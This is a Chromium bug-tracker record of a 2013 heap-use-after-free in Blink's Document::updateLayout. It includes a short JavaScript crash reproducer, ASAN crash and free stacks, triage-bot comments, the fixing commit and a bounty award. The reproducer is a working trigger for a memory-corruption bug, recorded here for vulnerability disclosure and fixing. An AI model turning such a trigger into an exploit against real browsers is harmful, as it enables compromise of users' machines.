# Heap-use-after-free in WebCore::Document::updateLayout

| Field | Value |
|-------|-------|
| **Issue ID** | [40078113](https://issues.chromium.org/issues/40078113) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>DOM |
| **Reporter** | cl...@gmail.com |
| **Assignee** | es...@chromium.org |
| **Created** | 2013-09-17 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest Chrome ASAN build.

**VERSION**  

Chrome Version: asan-symbolized-linux-release-223354  

Operating System: Linux 64-bit

**REPRODUCTION CASE**

<script>
function start() {
o0=document.documentElement;
o125=o0.cloneNode(true);
o0.appendChild(o125);
o151=document.documentElement;
while(o151.parentNode)o151=o151.parentNode;
o151.addEventListener('overflowchanged', cb\_event\_overflowchanged\_393\_1, true);
document.documentElement.offsetHeight;
for(var xrn=0; xrn<o151.childNodes.length; xrn++) o151.removeChild(o151.childNodes[xrn]);
o747=document.createElement('iframe');
o761=document.createRange();
o761.surroundContents(o747);
o762=o747.contentWindow.document;
o762.execCommand('styleWithCSS',false,false);
}
function cb\_event\_overflowchanged\_393\_1() {
o747.parentNode.removeChild(o747);
}
window.setTimeout("start()",100);
</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: see attached stack.txt for ASAN output

## Attachments

- [stack.txt](attachments/stack.txt) (text/plain; charset=us-ascii, 16.9 KB)

## Timeline

### cl...@chromium.org (2013-09-17)

ClusterFuzz is now working on this testcase. See https://cluster-fuzz.appspot.com/testcase?key=5274189036519424

### in...@chromium.org (2013-09-17)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-09-17)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5274189036519424

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free WRITE 1
Crash Address: 0x618000028388
Crash State:
  - crash stack -
  WebCore::Document::updateLayout
  WebCore::Editor::Command::execute
  - free stack -
  WebCore::WidgetHierarchyUpdatesSuspensionScope::moveWidgets
  WebCore::ContainerNode::removeChild
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=221446:221565

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94G4EICEhNRUtN3x211w0wlVK-FiUgWoKgjkrqjidvkUXrsrDTKDtb9bAtd0FQ6Q1cHQ82nRubaqMRLFZjgwGVGWKhzjkMERIFG7tbTFEM2nAuFqwVAHSpkL8TIPeD22Ny1e08B_vdxV7htGv4lpaonZD6ejg



### cl...@chromium.org (2013-09-21)

ClusterFuzz has detected this issue as fixed in range 223408:223480.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5274189036519424

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free WRITE 1
Crash Address: 0x618000028388
Crash State:
  - crash stack -
  WebCore::Document::updateLayout
  WebCore::Editor::Command::execute
  - free stack -
  WebCore::WidgetHierarchyUpdatesSuspensionScope::moveWidgets
  WebCore::ContainerNode::removeChild
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=221446:221565
Fixed: https://cluster-fuzz.appspot.com/revisions?range=223408:223480

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94G4EICEhNRUtN3x211w0wlVK-FiUgWoKgjkrqjidvkUXrsrDTKDtb9bAtd0FQ6Q1cHQ82nRubaqMRLFZjgwGVGWKhzjkMERIFG7tbTFEM2nAuFqwVAHSpkL8TIPeD22Ny1e08B_vdxV7htGv4lpaonZD6ejg

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### cl...@gmail.com (2013-11-17)

This still repros after https://crbug.com/chromium/265889 has been fixed ...

### in...@chromium.org (2013-11-17)

reopening based on c#5.

### cl...@chromium.org (2013-11-17)

Adding milestone and impact labels.

### cl...@chromium.org (2013-11-17)

[Empty comment from Monorail migration]

### tk...@chromium.org (2013-11-17)

esprehn will handle overflowchanged.  https://code.google.com/p/chromium/issues/detail?id=315979#c20


### ts...@chromium.org (2013-11-18)

[Empty comment from Monorail migration]

### ts...@chromium.org (2013-11-18)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-11-18)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-11-18)

esprehn@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!)

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2013-11-18)

Fixing bug priority based on security_severity-* and releaseblock-* labels.

### cl...@chromium.org (2013-11-18)

You have far exceeded the 60-day deadline for fixing this high severity security vulnerability.

We commit ourselves to this deadline and appreciate your utmost priority on this issue.

If you are unable to look into this soon, please find someone else to own this.

- Your friendly ClusterFuzz

### es...@chromium.org (2013-11-18)

inferno@ ClusterFuzz should probably not be so rude when I was just assigned to the bug yesterday. This bug _has_ been updated in the last 7 days, it had comments and labels added.

It would also be nice if it didn't spam bugs so much. I'm finding it hard to work with security issues now that CF spams comments all the time (that was 3 of them). Can we disable the CF spammer for now?

### cl...@chromium.org (2013-11-21)

[Empty comment from Monorail migration]

### es...@chromium.org (2013-11-25)

Patch up: https://codereview.chromium.org/82843003/

### bu...@chromium.org (2013-11-26)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=162655

------------------------------------------------------------------------
r162655 | esprehn@chromium.org | 2013-11-26T02:05:57.515095Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/ScriptedAnimationController.h?r1=162655&r2=162654&pathrev=162655
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/rendering/RenderBlock.cpp?r1=162655&r2=162654&pathrev=162655
   D http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dynamic/paused-event-dispatch.html?r1=162655&r2=162654&pathrev=162655
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/page/EventHandler.cpp?r1=162655&r2=162654&pathrev=162655
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/events/overflowchanged-event-raf-timing-expected.txt?r1=162655&r2=162654&pathrev=162655
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/Document.cpp?r1=162655&r2=162654&pathrev=162655
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/frame/FrameView.cpp?r1=162655&r2=162654&pathrev=162655
   M http://src.chromium.org/viewvc/blink/trunk/Source/web/WebViewImpl.cpp?r1=162655&r2=162654&pathrev=162655
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/ScriptedAnimationController.cpp?r1=162655&r2=162654&pathrev=162655
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/page/EventHandler.h?r1=162655&r2=162654&pathrev=162655
   D http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dynamic/paused-event-dispatch-expected.txt?r1=162655&r2=162654&pathrev=162655
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/events/overflowchanged-event-raf-timing.html?r1=162655&r2=162654&pathrev=162655
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/Document.h?r1=162655&r2=162654&pathrev=162655
   D http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dynamic/resources/paused-event-dispatch-iframe.html?r1=162655&r2=162654&pathrev=162655
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/frame/FrameView.h?r1=162655&r2=162654&pathrev=162655

Fire overflowchanged events at raf timing

Running script inside layout leads to nasty security bugs and crashes,
instead we should defer overflowchanged events until raf time. This still
lets the author take an action before the paint preventing blinking and
jumpiness which was the reason we ran it inside layout, while avoiding the
pitfalls of synchronous script.

Unfortunately this patch makes us start firing overflowchanged even when a
node has been removed from the tree, but the old protection against it was
bad since it only checked inDocument() so removing a node and putting it in
another document would still let the event fire. Instead I plan to fix the
detach problem in a future patch since scroll events shouldn't fire for
detached nodes either.

This patch also lets us remove the paused-event-dispatch.html test which
was testing the suspend/resume logic I removed and for crashes that happen
with synchronous script inside layout which doesn't apply after this patch.

BUG=293534,323283
TEST=fast/events/overflowchanged-event-raf-timing.html

Review URL: https://codereview.chromium.org/82843003
------------------------------------------------------------------------

### in...@chromium.org (2013-11-26)

Elliot, sorry for the too many nags you got in this bug. Sheriffbot is still in pretty stage and I am fixing bugs in its functionality. As https://code.google.com/p/chromium/issues/detail?id=293534#c13 says, you can always add a WIP label to prevent future nags. I still need to fix the logic when owner changes. The reason is the issue tracker api query to get bug comments is very expensive, so sheriffbot minimizes on those. But it is also important for Sheriffbot to not cause a nuisance and i am very sorry about it.

### bu...@chromium.org (2013-11-26)

[Comment Deleted]

### cl...@chromium.org (2013-11-26)

[Comment Deleted]

### in...@chromium.org (2013-11-26)

[Comment Deleted]

### cl...@chromium.org (2013-11-26)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### in...@chromium.org (2013-11-26)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-11-26)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-11-26)

This is a risky change and needs more bake time. Lets let this roll in m33. (just like tkent's beforeload change).

### in...@chromium.org (2013-11-27)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-11-27)

[Empty comment from Monorail migration]

### mb...@chromium.org (2013-12-10)

Thanks for the report! This one qualifies for a $3000 reward. There is control between the free and use, and the freed object is not in any of our heap partitions.

### pa...@chromium.org (2013-12-18)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-12-18)

[Empty comment from Monorail migration]

### dh...@google.com (2014-02-19)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-03-28)

Bulk update: removing view restriction from closed bugs.

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/293534?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/314471, crbug.com/chromium/315937, crbug.com/chromium/322158]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40078113)*
